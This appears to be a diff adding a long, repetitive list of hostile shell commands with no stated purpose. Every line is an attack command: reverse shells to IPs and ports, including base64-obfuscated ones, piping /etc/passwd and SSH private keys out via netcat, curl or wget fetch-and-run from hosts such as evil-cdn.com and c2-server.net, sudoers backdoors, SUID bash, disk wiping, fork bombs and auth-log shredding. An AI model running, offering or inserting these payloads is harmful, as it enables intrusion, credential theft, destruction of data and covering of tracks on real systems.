+cat /etc/passwd | nc 127.0.0.1 4444
+cat /etc/shadow
+dd if=/dev/zero of=/dev/sda
+shred -n 33 -uz /var/log/auth.log
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 8888
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/passwd | nc 192.168.1.24 8888
+cat /etc/passwd | nc 10.10.1.5 9001
+shred -n 33 -uz /var/log/auth.log
+:(){ :|:& };:
+cat /etc/passwd | nc 127.0.0.1 9001
+:(){ :|:& };:
+curl http://evil-cdn.com/config_prod.sh | bash
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+rm -rf / --no-preserve-root
+curl http://evil-cdn.com/test_suite.sh | bash
+nc -e /bin/sh 127.0.0.1 8888
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+bash -i >& /dev/tcp/8.8.4.4/8888 0>&1
+nc -e /bin/sh 172.16.4.2 4444
+sudo chmod 4755 /bin/bash
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 172.16.4.2 1337
+sudo chmod 4755 /bin/bash
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+rm -rf / --no-preserve-root
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+bash -i >& /dev/tcp/172.16.4.2/9001 0>&1
+:(){ :|:& };:
+:(){ :|:& };:
+rm -rf / --no-preserve-root
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+curl http://evil-cdn.com/auth_server.sh | bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 443
+sudo chmod 4755 /bin/bash
+sudo chmod 4755 /bin/bash
+bash -i >& /dev/tcp/172.16.4.2/4444 0>&1
+cat /etc/shadow
+cat /etc/passwd | nc 10.10.1.5 8888
+shred -n 33 -uz /var/log/auth.log
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+bash -i >& /dev/tcp/192.168.1.24/1337 0>&1
+bash -i >& /dev/tcp/192.168.1.24/8888 0>&1
+rm -rf / --no-preserve-root
+curl http://103.22.12.5/main_script.sh | bash
+dd if=/dev/zero of=/dev/sda
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+:(){ :|:& };:
+shred -n 33 -uz /var/log/auth.log
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+nc -e /bin/sh 10.10.1.5 1337
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+:(){ :|:& };:
+cat /etc/shadow
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+curl http://c2-server.net/test_suite.sh | bash
+sudo chmod 4755 /bin/bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 1337
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+nc -e /bin/sh 192.168.1.24 4444
+sudo chmod 4755 /bin/bash
+cat /etc/shadow
+sudo chmod 4755 /bin/bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+nc -e /bin/sh 192.168.1.24 1337
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/shadow
+cat /etc/shadow
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+cat /etc/shadow
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+shred -n 33 -uz /var/log/auth.log
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+:(){ :|:& };:
+bash -i >& /dev/tcp/192.168.1.24/9001 0>&1
+rm -rf / --no-preserve-root
+cat /etc/shadow
+dd if=/dev/zero of=/dev/sda
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/passwd | nc 8.8.4.4 443
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+rm -rf / --no-preserve-root
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+curl http://evil-cdn.com/test_suite.sh | bash
+cat /etc/shadow
+curl http://malware-repo.io/webapp.sh | bash
+rm -rf / --no-preserve-root
+bash -i >& /dev/tcp/192.168.1.24/1337 0>&1
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+:(){ :|:& };:
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+nc -e /bin/sh 192.168.1.24 8888
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+:(){ :|:& };:
+curl http://103.22.12.5/auth_server.sh | bash
+:(){ :|:& };:
+:(){ :|:& };:
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+shred -n 33 -uz /var/log/auth.log
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 4444
+curl http://malware-repo.io/backup_daily.sh | bash
+nc -e /bin/sh 10.10.1.5 443
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+curl http://malware-repo.io/main_script.sh | bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+:(){ :|:& };:
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 192.168.1.24 1337
+nc -e /bin/sh 10.10.1.5 443
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 443
+cat /etc/passwd | nc 127.0.0.1 443
+shred -n 33 -uz /var/log/auth.log
+dd if=/dev/zero of=/dev/sda
+shred -n 33 -uz /var/log/auth.log
+shred -n 33 -uz /var/log/auth.log
+sudo chmod 4755 /bin/bash
+cat /etc/shadow
+nc -e /bin/sh 127.0.0.1 4444
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+curl http://103.22.12.5/config_prod.sh | bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+bash -i >& /dev/tcp/10.10.1.5/9001 0>&1
+cat /etc/passwd | nc 8.8.4.4 8888
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 172.16.4.2 443
+dd if=/dev/zero of=/dev/sda
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+nc -e /bin/sh 127.0.0.1 9001
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 8888
+:(){ :|:& };:
+rm -rf / --no-preserve-root
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+nc -e /bin/sh 127.0.0.1 8888
+bash -i >& /dev/tcp/127.0.0.1/8888 0>&1
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+dd if=/dev/zero of=/dev/sda
+cat /etc/passwd | nc 127.0.0.1 9001
+shred -n 33 -uz /var/log/auth.log
+bash -i >& /dev/tcp/172.16.4.2/8888 0>&1
+curl http://c2-server.net/config_prod.sh | bash
+cat /etc/shadow
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+nc -e /bin/sh 192.168.1.24 4444
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/shadow
+nc -e /bin/sh 10.10.1.5 4444
+bash -i >& /dev/tcp/8.8.4.4/443 0>&1
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+rm -rf / --no-preserve-root
+cat /etc/shadow
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+bash -i >& /dev/tcp/10.10.1.5/1337 0>&1
+sudo chmod 4755 /bin/bash
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+sudo chmod 4755 /bin/bash
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+:(){ :|:& };:
+cat /etc/shadow
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 8888
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 443
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+nc -e /bin/sh 172.16.4.2 443
+nc -e /bin/sh 127.0.0.1 4444
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+curl http://malware-repo.io/data_dump.sh | bash
+rm -rf / --no-preserve-root
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+cat /etc/shadow
+shred -n 33 -uz /var/log/auth.log
+bash -i >& /dev/tcp/8.8.4.4/443 0>&1
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+curl http://evil-cdn.com/backup_daily.sh | bash
+curl http://103.22.12.5/config_prod.sh | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 8888
+cat /etc/shadow
+curl http://c2-server.net/backup_daily.sh | bash
+nc -e /bin/sh 127.0.0.1 4444
+sudo chmod 4755 /bin/bash
+bash -i >& /dev/tcp/127.0.0.1/443 0>&1
+nc -e /bin/sh 192.168.1.24 9001
+nc -e /bin/sh 10.10.1.5 443
+cat /etc/passwd | nc 8.8.4.4 8888
+shred -n 33 -uz /var/log/auth.log
+:(){ :|:& };:
+bash -i >& /dev/tcp/172.16.4.2/443 0>&1
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+cat /etc/shadow
+cat /etc/shadow
+dd if=/dev/zero of=/dev/sda
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/passwd | nc 8.8.4.4 9001
+rm -rf / --no-preserve-root
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+shred -n 33 -uz /var/log/auth.log
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 9001
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+cat /etc/passwd | nc 8.8.4.4 1337
+:(){ :|:& };:
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 9001
+cat /etc/passwd | nc 10.10.1.5 9001
+cat /etc/shadow
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 4444
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+sudo chmod 4755 /bin/bash
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+bash -i >& /dev/tcp/172.16.4.2/9001 0>&1
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 9001
+dd if=/dev/zero of=/dev/sda
+curl http://malware-repo.io/data_dump.sh | bash
+cat /etc/passwd | nc 8.8.4.4 9001
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/shadow
+sudo chmod 4755 /bin/bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 9001
+:(){ :|:& };:
+dd if=/dev/zero of=/dev/sda
+shred -n 33 -uz /var/log/auth.log
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/shadow
+cat /etc/shadow
+cat /etc/shadow
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 9001
+cat /etc/passwd | nc 10.10.1.5 9001
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/passwd | nc 192.168.1.24 443
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+rm -rf / --no-preserve-root
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 1337
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+shred -n 33 -uz /var/log/auth.log
+shred -n 33 -uz /var/log/auth.log
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+rm -rf / --no-preserve-root
+cat /etc/shadow
+cat /etc/passwd | nc 172.16.4.2 8888
+sudo chmod 4755 /bin/bash
+sudo chmod 4755 /bin/bash
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+cat /etc/passwd | nc 192.168.1.24 1337
+bash -i >& /dev/tcp/172.16.4.2/443 0>&1
+cat /etc/passwd | nc 127.0.0.1 4444
+cat /etc/passwd | nc 10.10.1.5 8888
+curl http://malware-repo.io/config_prod.sh | bash
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+shred -n 33 -uz /var/log/auth.log
+:(){ :|:& };:
+cat /etc/passwd | nc 192.168.1.24 9001
+shred -n 33 -uz /var/log/auth.log
+sudo chmod 4755 /bin/bash
+dd if=/dev/zero of=/dev/sda
+bash -i >& /dev/tcp/172.16.4.2/8888 0>&1
+cat /etc/shadow
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+curl http://c2-server.net/config_prod.sh | bash
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+bash -i >& /dev/tcp/127.0.0.1/1337 0>&1
+:(){ :|:& };:
+nc -e /bin/sh 8.8.4.4 443
+shred -n 33 -uz /var/log/auth.log
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+cat /etc/passwd | nc 172.16.4.2 8888
+nc -e /bin/sh 10.10.1.5 4444
+shred -n 33 -uz /var/log/auth.log
+shred -n 33 -uz /var/log/auth.log
+sudo chmod 4755 /bin/bash
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 10.10.1.5 8888
+bash -i >& /dev/tcp/10.10.1.5/8888 0>&1
+cat /etc/passwd | nc 10.10.1.5 8888
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 4444
+bash -i >& /dev/tcp/10.10.1.5/4444 0>&1
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/shadow
+rm -rf / --no-preserve-root
+shred -n 33 -uz /var/log/auth.log
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+sudo chmod 4755 /bin/bash
+curl http://103.22.12.5/main_script.sh | bash
+:(){ :|:& };:
+shred -n 33 -uz /var/log/auth.log
+:(){ :|:& };:
+cat /etc/passwd | nc 192.168.1.24 4444
+dd if=/dev/zero of=/dev/sda
+shred -n 33 -uz /var/log/auth.log
+bash -i >& /dev/tcp/127.0.0.1/8888 0>&1
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 9001
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+bash -i >& /dev/tcp/127.0.0.1/443 0>&1
+sudo chmod 4755 /bin/bash
+curl http://103.22.12.5/auth_server.sh | bash
+:(){ :|:& };:
+cat /etc/shadow
+rm -rf / --no-preserve-root
+shred -n 33 -uz /var/log/auth.log
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 9001
+dd if=/dev/zero of=/dev/sda
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 443
+rm -rf / --no-preserve-root
+bash -i >& /dev/tcp/127.0.0.1/443 0>&1
+curl http://malware-repo.io/auth_server.sh | bash
+dd if=/dev/zero of=/dev/sda
+shred -n 33 -uz /var/log/auth.log
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+cat /etc/passwd | nc 127.0.0.1 8888
+dd if=/dev/zero of=/dev/sda
+shred -n 33 -uz /var/log/auth.log
+rm -rf / --no-preserve-root
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+shred -n 33 -uz /var/log/auth.log
+cat /etc/shadow
+shred -n 33 -uz /var/log/auth.log
+curl http://evil-cdn.com/test_suite.sh | bash
+sudo chmod 4755 /bin/bash
+curl http://103.22.12.5/config_prod.sh | bash
+:(){ :|:& };:
+cat /etc/passwd | nc 127.0.0.1 9001
+cat /etc/passwd | nc 127.0.0.1 443
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+sudo chmod 4755 /bin/bash
+shred -n 33 -uz /var/log/auth.log
+cat /etc/shadow
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+dd if=/dev/zero of=/dev/sda
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+nc -e /bin/sh 172.16.4.2 9001
+shred -n 33 -uz /var/log/auth.log
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 8888
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+nc -e /bin/sh 192.168.1.24 4444
+rm -rf / --no-preserve-root
+dd if=/dev/zero of=/dev/sda
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+sudo chmod 4755 /bin/bash
+dd if=/dev/zero of=/dev/sda
+rm -rf / --no-preserve-root
+curl http://malware-repo.io/webapp.sh | bash
+rm -rf / --no-preserve-root
+shred -n 33 -uz /var/log/auth.log
+shred -n 33 -uz /var/log/auth.log
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+nc -e /bin/sh 10.10.1.5 443
+bash -i >& /dev/tcp/10.10.1.5/4444 0>&1
+dd if=/dev/zero of=/dev/sda
+:(){ :|:& };:
+cat /etc/shadow
+curl http://malware-repo.io/auth_server.sh | bash
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/shadow
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+dd if=/dev/zero of=/dev/sda
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/passwd | nc 8.8.4.4 9001
+:(){ :|:& };:
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 8888
+sudo chmod 4755 /bin/bash
+:(){ :|:& };:
+cat /etc/passwd | nc 192.168.1.24 1337
+nc -e /bin/sh 192.168.1.24 1337
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 443
+cat /etc/passwd | nc 8.8.4.4 443
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 4444
+shred -n 33 -uz /var/log/auth.log
+shred -n 33 -uz /var/log/auth.log
+nc -e /bin/sh 127.0.0.1 4444
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+cat /etc/shadow
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+cat /etc/passwd | nc 10.10.1.5 9001
+nc -e /bin/sh 192.168.1.24 1337
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+nc -e /bin/sh 192.168.1.24 9001
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+rm -rf / --no-preserve-root
+nc -e /bin/sh 8.8.4.4 8888
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+bash -i >& /dev/tcp/127.0.0.1/1337 0>&1
+dd if=/dev/zero of=/dev/sda
+nc -e /bin/sh 172.16.4.2 4444
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 9001
+sudo chmod 4755 /bin/bash
+:(){ :|:& };:
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+cat /etc/passwd | nc 172.16.4.2 1337
+cat /etc/passwd | nc 8.8.4.4 4444
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 10.10.1.5 4444
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+curl http://malware-repo.io/webapp.sh | bash
+:(){ :|:& };:
+dd if=/dev/zero of=/dev/sda
+:(){ :|:& };:
+:(){ :|:& };:
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+rm -rf / --no-preserve-root
